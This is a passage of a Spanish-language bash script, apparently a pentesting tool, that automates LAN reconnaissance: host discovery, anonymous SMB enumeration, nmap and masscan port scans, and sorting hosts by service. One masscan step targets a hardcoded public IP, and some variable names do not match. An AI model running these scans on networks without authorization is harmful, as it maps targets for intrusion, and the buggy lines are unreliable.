#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
##
# cracker.sh admin/admin
# PoC Suite3
# https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
# metasploit scanner/http/enum_wayback
# Identificar redes con  http://www.ip-calc.com/
# https://github.com/Exploit-install/Routerhunter-2.0
# Sacar herramientas de https://github.com/1N3/Sn1per https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest https://github.com/skavngr/rapidscan
# sslscan -h
##

OKBLUE='\033[94m'
OKRED='\033[91m'
OKYELLOW="\033[0;33m" 
OKGREEN='\033[92m'
RESET='\e[0m'	


################## Config HERE ####################
#netA="10.0.X.0/24";
netA="10.10.X.0/24";
netB="172.16.X.0/24";
netC="192.168.X.0/24";
#netC="192.168.X.0/24";
port_scan_num=1;
min_ram=400;
#############################

live_hosts=".datos/total-host-vivos.txt"
arp_list=".datos/lista-arp.txt"
smb_list=".escaneos/lista-smb.txt"
dns_list=".escaneos/lista-dns.txt"
mass_scan_list=".escaneos/lista-mass-scan.txt"
ping_list=".escaneos/lista-ping.txt"
smbclient_list=".escaneos/lista-smbclient.txt"
prefijo=""


function print_ascii_art {
cat << "EOF"
   __               __                                 
  / /  __ _ _ __   / _\ ___ __ _ _ __  _ __   ___ _ __ 
 / /  / _` | '_ \  \ \ / __/ _` | '_ \| '_ \ / _ \ '__|
/ /__| (_| | | | | _\ \ (_| (_| | | | | | | |  __/ |   
\____/\__,_|_| |_| \__/\___\__,_|_| |_|_| |_|\___|_|   
                                                       

					daniel.torres@owasp.org
					https://github.com/DanielTorres1

EOF
}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}
	
print_ascii_art


while getopts ":t:i:s:d:o:" OPTIONS
do
            case $OPTIONS in
            t)     TYPE=$OPTARG;;
            s)     SUBNET_FILE=$OPTARG;;
            i)     FILE=$OPTARG;;
            d)     DOMAIN=$OPTARG;;
            o)     OFFSEC=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TYPE=${TYPE:=NULL}
SUBNET_FILE=${SUBNET_FILE:=NULL}
FILE=${FILE:=NULL}
DOMAIN=${DOMAIN:=NULL}
OFFSEC=${OFFSEC:=NULL}

#if [ $TYPE = NULL ] ; then
#if [[ $TYPE == NULL] || [ $DOMAIN == NULL ]]; then
if [ "$TYPE" = NULL ] || [ "$DOMAIN" = NULL ]; then

cat << "EOF"

Opciones: 

-t : Tipo de escaneo [completo/parcial]
-d : dominio

Definicion del alcance:
	-s : Lista con las subredes a escanear (Formato CIDR 0.0.0.0/24)
	-i : Lista con las IP a escanear

Ejemplo 1: Escanear la red local (completo)
	lanscanner.sh -t completo -d ejemplo.com

Ejemplo 2: Escanear el listado de IPs (completo)
	lanscanner.sh -t completo -i lista.txt -d ejemplo.com

Ejemplo 3: Escanear el listado de subredes (completo)
	lanscanner.sh -t completo -s subredes.txt -d ejemplo.com
	
Ejemplo 4: Solo enumerar los servicios ya identificados
	lanscanner.sh -t enumerar
EOF

exit
fi
######################

if [[ $TYPE == "completo" ]] || [ $TYPE == "parcial" ]; then


echo -e "\n\n$OKYELLOW ########### Configurando los parametros ############## $RESET"

if [ ! -d ".servicios" ]; then # si ya ejecutamos recon.sh antes

  echo -e "$OKBLUE Cual es el nombre del proyecto? $RESET"
  read project

  mkdir $project
  cd $project
  prefijo="../"


	mkdir .arp
	mkdir .escaneos
	mkdir .datos
	mkdir .nmap
	mkdir .nmap_1000p
	mkdir .nmap_banners
	mkdir .enumeracion
	mkdir .enumeracion2 
	mkdir .banners
	mkdir .banners2
	mkdir .vulnerabilidades	
	mkdir .vulnerabilidades2 
	mkdir .masscan
	mkdir reportes
	mkdir archivos
	mkdir webClone
	mkdir metasploit
	mkdir credenciales
	mkdir .servicios
	mkdir .tmp
	mkdir -p logs/cracking
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades
	
	cp /usr/share/lanscanner/resultados.db .
fi

touch $smb_list 
touch $smbclient_list
touch $mass_scan_list 
touch $ping_list


#echo -e "$OKBLUE Que interfaz usaremos? eth0,tap0, etc ?$RESET"
#read 
iface=`ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2;getline}' | tail -1`
echo -e "$OKBLUE Usando la interfaz $iface $RESET"

my_ip=`ifconfig $iface | grep -i mask | awk '{print $2}' | sed 's/addr://g' `
my_mac=`ifconfig $iface | grep ether | awk '{print $2}'`

if [ -z "$my_mac" ]
then
      my_mac=`ifconfig $iface | grep HWaddr | awk '{print $5}'`
fi

my_route=`route -n | grep UG | awk '{print $2}'`
date=`date`
current_ip=`ifconfig $iface | grep netmask | awk '{print $2}'`
current_subnet=`ifconfig $iface | grep -i mask | awk '{print $2}' | cut -d . -f 1-3`
dns=`grep --color=never nameserver /etc/resolv.conf`

rm  reportes/info.txt 2>/dev/null
echo -e "Datos del escaneo:" | tee -a reportes/info.txt
echo -e "\t IP Origen: $my_ip " | tee -a reportes/info.txt
echo -e "\t MAC : $my_mac" | tee -a reportes/info.txt
echo -e "\t Gateway: $my_route " | tee -a reportes/info.txt
echo -e "\t DNS: $dns " | tee -a reportes/info.txt
echo -e "\t Subnet: $current_subnet.0/24 " | tee -a reportes/info.txt
echo -e "\t Date: $date  \n" | tee -a reportes/info.txt

  
echo -e "[+] Lanzando monitor $RESET" 
xterm -hold -e monitor.sh 2>/dev/null&
sleep 5

# Using ip list    
  if [ $FILE != NULL ] ; then        
     echo -e  "[+] Usando  archivo : $FILE " 
     if [ ! -f $prefijo$FILE ]; then
		echo -e  "$OKRED El archivo no existe ! $RESET"
		exit
	 fi	
     
     cat $prefijo$FILE | cut -d ";" -f 1 | sort | uniq > $live_hosts    
    
    ####### descubrir mas host con smbclient  #
   #echo -e "$OKBLUE ¿Realizaremos escaneo con smbclient para descubrir mas host? s/n (Recomendado para LAN) $RESET"
   #read smbclient

   #if [ $smbclient == 's' ]
   #then     
	#	echo -e "[+] Buscando mas host vivos con smbclient" 
		#for ip in `cat $live_hosts`;			
		#do 		
			#smbclient -L $ip -U "%"  | egrep -vi "comment|---|master|Error|reconnecting|failed" | awk '{print $1}' | tee -a .escaneos/smbclient.txt 2>/dev/null
		#done
		#cat .escaneos/smbclient.txt | sort | sort | uniq > .escaneos/smbclient2.txt

		#for hostname in `cat .escaneos/smbclient2.txt`;
		#do 			
			#host $hostname | grep "has address" | cut -d " " -f 4 >> $smbclient_list
		#done
		
		#cat $prefijo$FILE $smbclient_list | cut -d "," -f 2 | sort | sort | uniq > $live_hosts # join file + smbclient_lis		
		#cat $live_hosts
		#echo -e "\t"       
		#echo -e  " ################################" 	
   #fi   
   #cat $live_hosts | cut -d . -f 1-3 | sort | sort | uniq > .datos/subnets.txt # get subnets      
	##################
    
  else

# FASE: 1
#######################################  Discover live hosts ##################################### 
  
  echo -e "[+] Buscar host vivos en otras redes usando ICMP,SMB,TCP21,22,80,443 \n" 
  echo -e "$OKYELLOW [+] FASE 1: DESCUBRIR HOST VIVOS $RESET"

  ######## ARP ########
  echo -e "[+] Obteniendo host vivos locales"
  arp-scan $iface $current_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null
  sleep 2
  arp-scan $iface $current_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null  
  
  sort .arp/$current_subnet.0.arp2 | sort | uniq > .arp/$current_subnet.0.arp
  rm .arp/$current_subnet.0.arp2
  echo -e "\t \n"
  
  	# ARP
  for ip_list in $(ls .arp | egrep -v "all|done"); do      
      cat .arp/"$ip"_list | egrep -v "DUP|packets" | grep ^1 | awk '{print $1}' | sort >> $arp_list
      mv .arp/"$ip"_list .arp/"$ip"_list.done	
   done;  
  #######################  
  
 if [ $SUBNET_FILE = NULL ] ; then
	echo -e "$OKBLUE Definir el numero de redes a escanear en busca de hosts vivos $RESET"    
	echo -e "$OKYELLOW\t Ej:  Si escribe $OKRED 20$OKYELLOW se escaneara las redes :"  
	#echo -e "10.0$OKRED.1-20$OKYELLOW.0/24  \n192.168$OKRED.1-20$OKYELLOW.0/24  \n172.16$OKRED.1-20$OKYELLOW.0/24  $RESET"   
	net1="${netA/.X/$OKRED.1-20$OKYELLOW}"
	net2="${netB/.X/$OKRED.1-20$OKYELLOW}"
	net3="${netC/.X/$OKRED.1-20$OKYELLOW}"
	echo -e $net1
	echo -e $net2
	echo -e $net3
  
  
	echo -e "$OKBLUE Que redes escanear ? $RESET"
	read num_nets_enum     
  fi
  
	  	  
	echo -e "$OKBLUE Realizar escaneo de puertos 22,80,443 en busca de mas hosts vivos ? s/n $RESET"	  
	read adminports
	  
	echo -e "$OKBLUE Realizar escaneo ICMP (ping) en busca de mas hosts vivos ? (Mas lento aun ...) s/n $RESET"	  
	read pingscan	 

	    	  	 
	  	  	 	
	  #################################   SMB    ####################
	  echo -e "##### Realizando escaneo SMB en busca de mas hosts vivos #####"	  
	  
	  if [ $SUBNET_FILE != NULL ] ; then	  	 
		for subnet in `cat $prefijo$SUBNET_FILE`;
		do 
			echo -e "\t[+] Escaneando: $subnet "
			nbtscan $subnet | tee -a .escaneos/escaneo-smb.txt
		done
		
	  else
		# escaneo a redes definidas por el usuario
		smb-scan.pl $netA $netB $netC $num_nets_enum | tee -a .escaneos/escaneo-smb.txt		
	  fi
	  
	  cat .escaneos/escaneo-smb.txt | grep : | awk '{print $1}' | grep --color=never ^1 > $smb_list 2>/dev/null	  
      
                                   
      echo -e  " #######################################################" 
      echo -e  "$OKYELLOW Con el escaneo SMB  encontramos estos hosts vivos: $RESET" 
      cat $smb_list
      echo -e "\t"      
      #######################################
      
      
      #################################   DNS    ####################

	  
	  if [ $SUBNET_FILE != NULL ] ; then	
   	 	echo -e "##### Realizando escaneo DNS en busca de mas hosts vivos #####"	  
  	 
		for subnet in `cat $prefijo$SUBNET_FILE`;
		do 
			echo -e "\t[+] Escaneado $subnet "
			dnsrecon -r $subnet | tee -a .escaneos/escaneo-dns.txt
		done

	  	#cat .escaneos/escaneo-dns.txt | grep : | awk '{print $1}' > $smb_list 2>/dev/null	  
		grep PTR .escaneos/escaneo-dns.txt 2>/dev/null| awk '{print $4}' | grep --color=never ^1 > $dns_list 2>/dev/null			  

                                   
	      echo -e  " #######################################################" 
	      echo -e  "$OKYELLOW Con el escaneo DNS  encontramos estos hosts vivos: $RESET" 
	      cat $dns_list
	      echo -e "\t"      
	      #######################################
	  fi
	  
           
      
      #################################   PORT 23,80,443,22  escaneando ##################
	  
	  if [ $adminports == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo al puerto 22,80,443 en busca de mas hosts vivos ##### $RESET"	  
      
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "\t[+] Escaneando: $subnet "
				masscan -p21,22,23,80,443,445 --rate=150 $subnet | tee -a .escaneos/mass-scan.txt
			done		
		else
				mass-scan.pl $netA $netB $netC .escaneos/mass-scan.txt
		fi
	               
		
		cat .escaneos/mass-scan.txt | cut -d " " -f 6 | sort | uniq | grep --color=never ^1 > $mass_scan_list 2>/dev/null

		echo -e  " #######################################################" 
		echo -e  "$OKRED Encontramos estos hosts vivos: $RESET" 
		cat $mass_scan_list
		echo -e "\t"             
      fi  	  	  
      
      #######################################
	  
	  
	  
	   #################################   ICMP escaneando   ####################
	  
	  if [ $pingscan == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo ping en busca de mas hosts vivos ##### $RESET"	  
		
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "[+] Escaneando: $subnet "
				fping -a -g $subnet | tee -a .escaneos/escaneo-ping.txt 
			done		
		else
				ping-scan.pl $netA $netB $netC $num_nets_enum | tee -a .escaneos/escaneo-ping.txt 
		fi
		
        
        cat .escaneos/escaneo-ping.txt | grep -v Escaneando  | sort | sort | uniq | grep --color=never ^1 > $ping_list 2>/dev/null
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo ICMP (ping) encontramos estos hosts vivos: $RESET" 
        cat $ping_list
        echo -e "\t"       
      fi        
	  #######################################
	           
    #fi #if scan_type
      #################################   smbclient   ####################
	  
	   ####### smbclient scan #
    echo -e "$OKBLUE ¿Realizaremos escaneo con smbclient para descubrir mas host? s/n (Recomendado para LAN) $RESET"
	read smbclient

    if [ $smbclient == 's' ]
   then     
		
		echo -e "##### Realizando escaneo smclient en busca de mas hosts vivos #####"	  
		
		######## preliminar join arp + ping +smb + mass scan + DNS to review more hosts
		cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
		sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
		##################  
     
		for ip in `cat $live_hosts`;			
		do 		
			smbclient -L $ip -U "%"  | egrep -vi "comment|---|master|Error|reconnecting|failed" | awk '{print $1}' >> .escaneos/smbclient.txt 2>/dev/null
		done
		cat .escaneos/smbclient.txt | sort | uniq | sort > .escaneos/smbclient2.txt

		for hostname in `cat .escaneos/smbclient2.txt`;
		do 			
			host $hostname | grep "has address" | cut -d " " -f 4 >> $smbclient_list
		done
				
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo de smbclient encontramos estos hosts vivos: $RESET" 
        cat $smbclient_list
        echo -e "\t"             
	  ####################################### 
	
   fi   
	##################
	

    
    echo -e  " #######################################################" 
    ############ Generando lista ###########
   
    
     ######## Final join arp + ping +smb + mass scan + DNS + smbclient
	 cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list $smbclient_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
	 sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
     ##################     
        
     echo -e "Revisar si hay host que no debemos escanear ($live_hosts). Presionar ENTER para continuar"
     read n	    	       
	  
	  echo -e  " #######################################################" 
      echo -e  "[i] TOTAL HOST VIVOS ENCONTRADOS:" 
      echo -e "\t"                  
 fi # if FILE
 
 # generate subnets 
 cat $live_hosts | cut -d . -f 1-3 | sort | uniq > .datos/subnets.txt

###### #check host number########
total_hosts=`wc -l .datos/total-host-vivos.txt | sed 's/.datos\/total-host-vivos.txt//g' `
echo -e  "TOTAL HOST VIVOS ENCONTRADOS: $total_hosts hosts" 
cat $live_hosts

if test -f "subdominios.txt"; 
then
	internet="s"
    echo -e "[+] Se detecto que estamos escaneando IPs públicas."	  
else
	internet="n"
	echo -e "[+] Adiciona/quita IPs y presiona ENTER" 
	sleep 3
	gedit .datos/total-host-vivos.txt & 2>/dev/null
	read resp
fi    


#################################  

################## end discover live hosts ##################



# FASE: 2
echo -e "$OKYELLOW [+] FASE 2: ESCANEO DE PUERTOS,VoIP, etc $RESET"
################## Escanear (voip,smb,ports,etc) ##################

########### searching VoIP devices ##########
echo -e "############# Escaneando #################\n"

if [ $internet == "n" ]; then 	
    echo -e "#################### Buscando dispositivos VoIP: ######################"	  
	for subnet in $(cat .datos/subnets.txt); do
	  echo -e "[+] Escaneando $subnet.0/24"	  
	  svmap $subnet".0/24" > .enumeracion/$subnet-voip.txt 2>/dev/null 
    done;	
fi    
 
	
#####################
  
  
  ########### shared resource escaneando ##########
 if [ $TYPE = "parcial" ] ; then
	echo -e "$OKBLUE ¿Buscar recursos compartidos?: s/n $RESET"	
    read resp_shared
  fi
  
 
   
if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	echo -e "#################### Escaneo de puertos TCP ######################"	  
	
	if [ $TYPE == 'completo' ]        	    
	then		
		if [ $total_hosts -gt 200 ]
		then
			max_nmap_ins=15
		else
			max_nmap_ins2=`echo "$total_hosts/15 + 1" | bc -l`
			max_nmap_ins=`echo $max_nmap_ins2 | awk '{print int($1+0.5)}'`	# redondeado
		fi	
		echo -e "$OKBLUE [+]Escaneado los 1000 puertos mas usados $RESET"
		echo -e "$OKBLUE [+]Número máximo de instancias de nmap: $max_nmap_ins $RESET"	
	else
		echo -e "$OKBLUE Configurar escaneo de puertos TCP: $RESET"		
		echo -e "\t Opcion 1: Los 1000 puertos mas usados (nmap) "
		echo -e "\t Opcion 2: Los 65535 puertos (masscan)"		
		echo -e "$OKBLUE Escribe el numero de la opcion: $RESET"	
		read port_scan_num
			
		echo -e "$OKBLUE ¿Cuantas instancias de nmap permitiremos (1-15)? $RESET"
		read max_nmap_ins  
	fi
	
     
     if [ $port_scan_num == '1' ]   
     then   	
     	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
     	nmap -n -Pn -iL $live_hosts -p21,22,23,110,80,443,8080,81,32764,82,83,84,85,37777,5432,3306,1525,1530,1526,1433,8728,1521,6379,27017,8291 -oG .nmap/nmap2-tcp.grep >> reportes/nmap-tcp.txt 2>/dev/null 
     	sleep 2;        			
			
     	echo -e "[+] Realizando escaneo tcp (solo 1000 puertos)" 
     	while read ip           
		do    			
			nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
			#echo -e "\tinstancias de nmap ($nmap_instancias)"
			if [ "$nmap_instancias" -lt $max_nmap_ins ] #Max 5 instances
			then
				#echo -e "\tnmap $ip"
				nmap -n -Pn $ip -oG .nmap_1000p/"$ip"_tcp.grep > .nmap_1000p/"$ip"_tcp.txt 2>/dev/null &					
				sleep 0.2;	
			else				
				while true; do
					echo -e "\tMax instancias de nmap ($nmap_instancias)"
					sleep 10;
					nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
					if [ "$nmap_instancias" -lt $max_nmap_ins ] #Max 5 instances
					then
						# ejecutamos 
						nmap -n -Pn $ip -oG .nmap_1000p/"$ip"_tcp.grep > .nmap_1000p/"$ip"_tcp.txt 2>/dev/null &
						break
					fi							
				done														
			fi		
			 #echo -e "\t[+] Done $ip"
		done <$live_hosts
     	
     	
     	########## esperar a que termine el escaneo
     	while true; do
			nmap_instancias=`pgrep nmap | wc -l`								
			if [ "$nmap_instancias" -gt 0  ];then	
				echo -e "\t[i] Todavia hay escaneos de nmap ($nmap_instancias) activos"  
				sleep 20
			else
				break		  		 
			fi				
		done	
		#####################
				
		echo -e "\n$OKBLUE[+] Revisando falsos positivos en el escaneo de puertos $RESET"
     	while read ip           
		do    			
			puertos_abiertos=`grep -o open .nmap_1000p/"$ip"_tcp.grep | wc -l`
			echo -e "La ip $ip  tiene $puertos_abiertos puertos abiertos"
			if [ "$puertos_abiertos" -gt 25 ]
			then				
				echo -e "\t$OKYELLOW [i] Sospechoso!!. Muchos puertos abiertos ($puertos_abiertos)$RESET"
				echo -e "[+] Volviendo a escanear solo 100 puertos $ip "
				#Borrar escaneo anterior
				rm .nmap_1000p/"$ip"_tcp.grep .nmap_1000p/"$ip"_tcp.txt 				
				nmap -n -Pn --top-ports 100 $ip -oG .nmap_1000p/"$ip"_tcp.grep > .nmap_1000p/"$ip"_tcp.txt 2>/dev/null
			fi	
			
			if [ "$puertos_abiertos" -eq 0 ]
			then				
				echo -e "\t$OKYELLOW [i] Nmap no descubrio ningun puerto abierto.$RESET"
				echo -e "[+]\tEscaneando con masscan $ip "
				#Borrar escaneo anterior
				rm .nmap_1000p/"$ip"_tcp.grep
				masscan --rate 500 -p53,104,110,111,10000,10001,16992,143,1521,1433,1900,17185,11211,1723,21,22,23,25,102,20000,2096,3221,3128,3306,389,37777,3389,443,445,465,4443,4433,4786,47808,502,554,5432,5222,5555,5601,587,5900,27017,28017,636,631,6379,6380,79,80,1099,7547,7071,8000,9001,8009,8080,8010,8081,8180,81,82,9443,8098,8443,9160,902,993,995,9000,9090,8728,82,83,84,85,8291,9200,9100,4786 200.87.224.122 --output-format grepable --output-filename .nmap_1000p/"$ip"_tcp.grep
				#nmap -n -Pn --top-ports 100 $ip -oG .nmap_1000p/"$ip"_tcp.grep > .nmap_1000p/"$ip"_tcp.txt 2>/dev/null
			fi
						
		done <$live_hosts
		
		
     	
     	# Solo puertos abiertos (sin banner)
     	cat .nmap_1000p/*.grep > .nmap/nmap1-tcp.grep 
     	cat .nmap_1000p/*.txt  >reportes/nmap-tcp.txt
     	
     	#     1000 puertos   +  puertos especifios
     	cat .nmap/nmap1-tcp.grep .nmap/nmap2-tcp.grep > .nmap/nmap-tcp.grep # join nmap scans
     	rm .nmap/nmap1-tcp.grep .nmap/nmap2-tcp.grep           
     fi	
     
			
	if [ $port_scan_num == '2' ]
    then    			
		for ip in $( cat $live_hosts  ); do        
			echo -e "[+] Escaneando todos los puertos de $ip con mass-escaneando (TCP)"   		
			masscan -p1-65535 --rate 700 $ip --output-format grepable --output-filename .masscan/$ip.tcp 2>/dev/null ;
			ports=`cat .masscan/$ip.tcp  | grep -o "[0-9][0-9]*/open" | tr '\n' ',	' | tr -d '/open'`		
			num_ports=`echo $ports | tr -cd ',' | wc -c`		

			if [ "$num_ports" -gt 35 ]
			then
				echo -e "\tSospechoso!!. Muchos puertos abiertos ($num_ports)"
			else				
				echo -e "[+] Identificando servicios de $ip ($ports)"
				nmap -n -sV -O -p $ports $ip -oG .escaneos/"$ip"_tcp.grep2 >> reportes/nmap-tcp.txt 2>/dev/null &						
			fi					                            			
        done 
        
        cat .escaneos/*.grep2 > .nmap/nmap-tcp.grep       
                       
     fi  # opcion 3   
     	
 fi # completo 
    

################### TCP/UDP escaneo  ###################
 if [ $TYPE = "parcial" ] ; then	
	echo -e "\n$OKBLUE Realizar escaneo de puertos UDP?: s/n $RESET"
    read udp_scan
 fi

 if [ $TYPE = "parcial" ] ; then	
	echo -e "\n$OKBLUE Realizar escaneo de puertos TCP?: s/n $RESET"
    read tcp_scan
  fi
   

 if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 	
    echo -e "#################### Escaneo de puertos UDP ######################"	  
       
		
	nmap -n -sU -p 53,161,500,67,1604,1900,623  -iL $live_hosts -oG .nmap/nmap-udp.grep > reportes/nmap-udp.txt 2>/dev/null 
		
	
	if [ $internet == "n" ]; then 	
	
		for subnet in $(cat .datos/subnets.txt); do
			echo -e "[+] Escaneando $subnet.0/24"	  
			masscan --interface $iface -pU:161 $subnet".0/24" | grep --color=never -i Discovered  > .masscan/$subnet-snmp.txt 2>/dev/null 
			masscan --interface $iface -pU:500 $subnet".0/24" | grep --color=never -i Discovered  > .masscan/$subnet-vpn.txt 2>/dev/null 						
		done;    
    fi	
	
	echo -e "\t"			
 fi	      
    
########## making reportes #######
if [[ $TYPE == "completo"  || $tcp_escaneando == "s"   || $udp_escaneando == "s" ]] ; then 
	echo -e "[+] Creando reporte nmap"
	# clean tcp wrapped
	
	#if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	#	cd reportes
	#	cat nmap-tcp2.txt | grep -v tcpwrapped > nmap-tcp.txt    
	#	rm nmap-tcp2.txt
	#	cd ..
	#fi
	
		
	# replace IP with subdominio
	#cat nmap-tcp.grep  | grep -v "Status: Up" >nmap-tcp.grep
	#rm nmap-tcp.grep
	#for dominio in `grep "Nmap escaneando reportes for" nmap-tcp.txt | cut -d " " -f 5`
	#do	   	             
		# echo -e "\tdominio $dominio"			
		#sed -i "1,/[0-9]\{2,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/s/[0-9]\{2,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/$dominio/g" nmap-tcp.grep
	#done	  
	#### generar reporte nmap ######   
	cd .nmap
	report-open-ports.pl -l ../$live_hosts -t nmap-tcp.grep -u nmap-udp.grep
	cd ../
fi
###################  
  
################### Ordernar IPs por servicio ###################
if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	cd .nmap	
					
	grep '/rtsp/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/camaras-ip.txt
	grep '/http-proxy/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/proxy-http.txt
	
	
	#web
	grep " 80/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:80\n"' | sort | uniq > ../.servicios/web.txt	
	grep " 81/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:81\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 82/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:82\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 83/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:83\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 84/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:84\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 85/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:85\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 86/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:86\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 87/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:87\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 88/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:88\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 89/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:89\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8080/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8080\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8081/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8081\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8082/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8082\n"' | sort | uniq >> ../.servicios/web.txt		
	grep " 8010/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8010\n"' | sort | uniq >> ../.servicios/web.txt		
	grep " 8800/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8800\n"' | sort | uniq >> ../.servicios/web.txt		
	
	grep ' 10000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:10000\n"' | sort | uniq >> ../.servicios/webmin.txt 
	grep ' 111/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:111\n"' | sort | uniq >> ../.servicios/rpc.txt 
	
	# web-ssl
	grep " 443/open" nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:443\n"' | sort | uniq > ../.servicios/web-ssl.txt
	grep " 8443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
	grep " 4443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
	grep " 4433/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4433\n"' | sort | uniq >> ../.servicios/web-ssl.txt	
		
	grep ' 21/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:21\n"' | sort | uniq >> ../.servicios/ftp.txt
	grep ' 513/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:513\n"' | sort | uniq >> ../.servicios/rlogin.txt
	## ssh																	del newline       add port
	grep ' 22/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:22\n"' | sort | uniq >> ../.servicios/ssh.txt
	grep ' 6001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6001\n"' | sort | uniq >> ../.servicios/ssh.txt
	grep ' 23/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:23\n"' | sort | uniq >> ../.servicios/telnet.txt
	
	## MAIL																	del newline       add port
	grep ' 25/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:25\n"' | sort | uniq >> ../.servicios/smtp.txt
	grep ' 587/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:587\n"' | sort | uniq >> ../.servicios/smtp.txt
	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../.servicios/smtp.txt
	grep ' 110/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:110\n"' | sort | uniq >> ../.servicios/pop.txt 
	grep ' 143/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:143\n"' | sort | uniq >> ../.servicios/imap.txt 
	grep ' 106/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:106\n"' | sort | uniq >> ../.servicios/pop3pw.txt 
  
	## ldap																	del newline       add port
